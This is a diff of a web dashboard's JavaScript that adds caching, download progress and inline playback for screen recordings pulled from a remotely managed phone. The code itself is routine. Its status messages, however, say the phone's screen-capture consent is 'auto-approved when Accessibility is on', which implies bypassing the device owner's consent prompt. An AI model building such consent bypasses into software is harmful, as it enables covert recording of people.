+      paintRecButton(btn, state);
+    });
+    const blob = await fetchTransferBlob(transfer);
+    await galleryCachePut({
+      key,
+      blob,
+      mimeType: "video/mp4",
+      displayName: meta.displayName || "Screen recording",
+      type: "video",
+      sizeBytes: blob.size,
+      savedAt: Date.now(),
+    });
+    state = {
+      status: "ready",
+      progress: 100,
+      displayName: meta.displayName || "Screen recording",
+      objectUrl: URL.createObjectURL(blob),
+      blob,
+    };
+    recItemState.set(key, state);
+    paintRecButton(btn, state);
+    await showRecInlinePreview(key);
+  } catch (e) {
+    state = { ...state, status: "error", progress: 0 };
+    recItemState.set(key, state);
+    paintRecButton(btn, state);
+    throw e;
+  }
 }
 
 async function refreshRecordingsPanel() {
@@ -6291,7 +6821,11 @@ async function refreshRecordingsPanel() {
         } else if (latest.status === "Completed") {
           transferBox.hidden = false;
           transferBox.textContent =
-            `Completed · ${formatRecTime(latest.durationMs || 0)} · use Download below.`;
+            `Completed · ${formatRecTime(latest.durationMs || 0)} · tap Play below.`;
+        } else if (/Waiting|Permission/i.test(String(latest.status || ""))) {
+          transferBox.hidden = false;
+          transferBox.textContent =
+            "Waiting for Cast approval on the phone (auto-approved when Accessibility is on)…";
         }
       }
     } else if (recUiState === "idle") {
@@ -6316,6 +6850,24 @@ async function refreshRecordingsPanel() {
           ? `<div class="muted" style="color:#c0392b">${escapeHtml(it.errorMessage)}</div>`
           : "";
         const canDownload = String(it.status || "") === "Completed" && it.transferId;
+        const key = canDownload ? recCacheKey(deviceId, it.transferId) : "";
+        const st = key ? recItemState.get(key) : null;
+        let btnLabel = "Download";
+        let btnClass = "btn-secondary btn-rec-dl";
+        if (st?.status === "downloading") {
+          btnLabel = `${Math.max(0, Math.min(100, Number(st.progress) || 0))}%`;
+          btnClass += " btn-file-progress";
+        } else if (st?.status === "ready") {
+          btnLabel = "Play";
+          btnClass += " btn-file-ready";
+        } else if (st?.status === "error") {
+          btnLabel = "Retry";
+          btnClass += " btn-file-error";
+        }
+        const progressStyle =
+          st?.status === "downloading"
+            ? ` style="--file-progress:${Math.max(0, Math.min(100, Number(st.progress) || 0))}%"`
+            : "";
         return `<div class="rec-row surface">
           <div><strong>${escapeHtml(it.displayName || it.recordingId)}</strong>
           <span class="status-badge">${escapeHtml(it.status || "")}</span></div>
@@ -6323,33 +6875,42 @@ async function refreshRecordingsPanel() {
           ${err}
           <div class="page-actions">
             ${canDownload
-              ? `<button type="button" class="btn-secondary btn-rec-dl" data-transfer="${escapeHtml(it.transferId)}">Download</button>`
+              ? `<button type="button" class="${btnClass}" data-transfer="${escapeHtml(it.transferId)}" data-name="${escapeHtml(it.displayName || "Screen recording")}" data-rec-key="${escapeHtml(key)}"${progressStyle} ${st?.status === "downloading" ? "disabled" : ""}>${escapeHtml(btnLabel)}</button>`
               : ""}
           </div>
         </div>`;
       })
       .join("");
+    await Promise.all(
+      items
+        .filter((it) => String(it.status || "") === "Completed" && it.transferId)
+        .map(async (it) => {
+          const key = recCacheKey(deviceId, it.transferId);
+          if (recItemState.get(key)?.status === "ready") return;
+          const cached = await galleryCacheGet(key);
+          if (!cached?.blob) return;
+          const state = {
+            status: "ready",
+            progress: 100,
+            displayName: cached.displayName || it.displayName || "Screen recording",
+            objectUrl: URL.createObjectURL(cached.blob),
+            blob: cached.blob,
+          };
+          recItemState.set(key, state);
+          const btn = list.querySelector(`[data-rec-key="${CSS.escape(key)}"]`);
+          paintRecButton(btn, state);
+        })
+    );
     list.querySelectorAll(".btn-rec-dl").forEach((btn) => {
       btn.addEventListener("click", async () => {
         const transferId = btn.getAttribute("data-transfer");
         if (!transferId) return;
+        const meta = {
+          transferId,
+          displayName: btn.getAttribute("data-name") || "Screen recording",
+        };
         try {
-          const t = await api(`/api/device/transfers?deviceId=${encodeURIComponent(deviceId)}`);
-          const rows = t.transfers || t.items || [];
-          const row = rows.find((x) => String(x.transferId || "") === transferId);
-          if (row?.downloadUrl) {
-            window.open(row.downloadUrl, "_blank");
-            return;
-          }
-          if (String(row?.status || "") === "failed") {
-            alert(`Upload failed: ${row.errorMessage || row.errorCode || "unknown"}`);
-            return;
-          }
-          alert(
-            row
-              ? `Transfer status: ${row.status || "unknown"}. Wait until Completed, then try again.`
-              : "Transfer not found yet — wait a few seconds and Refresh."
-          );
+          await downloadRecordingItem(deviceId, meta, btn);
         } catch (e) {
           alert(e instanceof Error ? e.message : String(e));
         }
@@ -7426,7 +7987,7 @@ document.getElementById("btn-rec-start")?.addEventListener("click", async () => 
     if (transferBox) {
       transferBox.hidden = false;
       transferBox.textContent =
-        "Approve Cast on the phone. Status becomes Recording when capture starts. Use Stop / Pause after that.";
+        "Approve Cast on the phone (auto-approved when Accessibility is on). Status becomes Recording when capture starts.";
     }
     // Wait for phone Firestore status — do not fake "Recording" locally.
     startRecordingsPoll(180000);
@@ -7520,6 +8081,7 @@ document.getElementById("btn-rec-stop")?.addEventListener("click", async () => {
   }
 });
 document.getElementById("btn-rec-refresh")?.addEventListener("click", () => refreshRecordingsPanel());
+document.getElementById("btn-rec-inline-close")?.addEventListener("click", () => closeRecInlineViewer());
 setRecButtonUi("idle");
 
 document.getElementById("btn-apps-refresh")?.addEventListener("click", () => refreshAppsPanel());
